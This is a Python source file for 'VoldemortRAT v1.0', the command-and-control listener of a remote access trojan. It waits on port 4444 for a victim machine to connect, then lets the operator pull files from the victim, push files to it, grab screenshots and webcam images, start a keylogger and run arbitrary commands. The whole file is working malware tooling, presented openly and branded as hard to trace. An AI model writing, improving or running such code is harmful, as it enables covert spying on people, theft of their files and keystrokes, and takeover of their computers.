import socket
import base64

def banner():
    print("\033[92m")  # Green text start
    print(r"""
██▒   █▓ ▒█████   ██▓    ▓█████▄ ▓█████  ███▄ ▄███▓ ▒█████   ██▀███  
▓██░   █▒▒██▒  ██▒▓██▒    ▒██▀ ██▌▓█   ▀ ▓██▒▀█▀ ██▒▒██▒  ██▒▓██ ▒ ██▒
 ▓██  █▒░▒██░  ██▒▒██░    ░██   █▌▒███   ▓██    ▓██░▒██░  ██▒▓██ ░▄█ ▒
  ▒██ █░░▒██   ██░▒██░    ░▓█▄   ▌▒▓█  ▄ ▒██    ▒██ ▒██   ██░▒██▀▀█▄  
  ░ ▐░  ░ ████▓▒░░██████▒░▒████▓ ░▒████▒▒██▒   ░██▒░ ████▓▒░░██▓ ▒██▒
  ░ ░░  ░ ▒░▒░▒░ ░ ▒░▓  ░ ▒▒▓  ▒ ░░ ▒░ ░░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
    ░░    ░ ▒ ▒░ ░ ░ ▒  ░ ░ ▒  ▒  ░ ░  ░░  ░      ░  ░ ▒ ▒░   ░▒ ░ ▒░
     ░░  ░ ░ ░ ▒    ░ ░    ░ ░  ░    ░   ░      ░   ░ ░ ░ ▒    ░░   ░ 
      ░      ░ ░      ░  ░   ░       ░  ░       ░       ░ ░     ░     
      ░                    ░                                        
                 \033[1mVoldemortRAT v1.0\033[0m
              "He Who Must Not Be Traced."
""")
    print("\033[0m")  # Reset color

def main():
    banner()

    host = "0.0.0.0"
    port = 4444

    server = socket.socket()
    server.bind((host, port))
    server.listen(1)

    print(f"[🔌] Listening on {host}:{port}...")
    conn, addr = server.accept()
    print(f"[+] Connection received from {addr[0]}")

    while True:
        try:
            cmd = input("🧿 Voldermort > ").strip()
            if not cmd:
                continue

            if cmd.lower() == "exit":
                conn.sendall((cmd + "\n").encode())
                print("[✖️] Session closed.")
                break

            elif cmd.startswith("download "):
                conn.sendall((cmd + "\n").encode())
                print("[⬇️] Receiving file from victim...")
                data = b""
                while True:
                    chunk = conn.recv(4096)
                    if b"[ENDFILE]" in chunk:
                        data += chunk.split(b"[ENDFILE]")[0]
                        break
                    data += chunk
                filename = cmd.split(" ")[1].split("\\")[-1]
                with open("downloaded_" + filename, "wb") as f:
                    f.write(data.replace(b"[STARTFILE]\n", b""))
                print(f"[+] File saved as downloaded_{filename}")

            elif cmd.startswith("upload "):
                filepath = input("[📁] Path of local file to upload: ").strip()
                try:
                    with open(filepath, "rb") as f:
                        b64data = base64.b64encode(f.read()).decode()
                    conn.sendall((cmd + "\n").encode())
                    response = conn.recv(1024).decode()
                    print("[↔️] " + response.strip())
                    conn.sendall((b64data + "\n").encode())
                    print("[+] File sent successfully.")
                except Exception as e:
                    print(f"[!] Error: {e}")

            elif cmd in ["screenshot", "webcam"]:
                conn.sendall((cmd + "\n").encode())
                print(f"[*] Waiting for {cmd} output...")
                data = b""
                while True:
                    chunk = conn.recv(4096)
                    if b"[ENDFILE]" in chunk:
                        data += chunk.split(b"[ENDFILE]")[0]
                        break
                    data += chunk
                filename = f"{cmd}.jpg" if cmd == "webcam" else f"{cmd}.png"
                with open("received_" + filename, "wb") as f:
                    f.write(data.replace(b"[STARTFILE]\n", b""))
                print(f"[+] Saved as received_{filename}")

            elif cmd == "keylog":
                conn.sendall((cmd + "\n").encode())
                print("[📝] Keylogger started. Victim must press CTRL+C to stop it.")

            else:
                conn.sendall((cmd + "\n").encode())
                data = conn.recv(8192).decode(errors="ignore")
                print(data.strip())

        except KeyboardInterrupt:
            print("\n[!] Session terminated manually.")
            conn.close()
            break

if __name__ == "__main__":
    main()
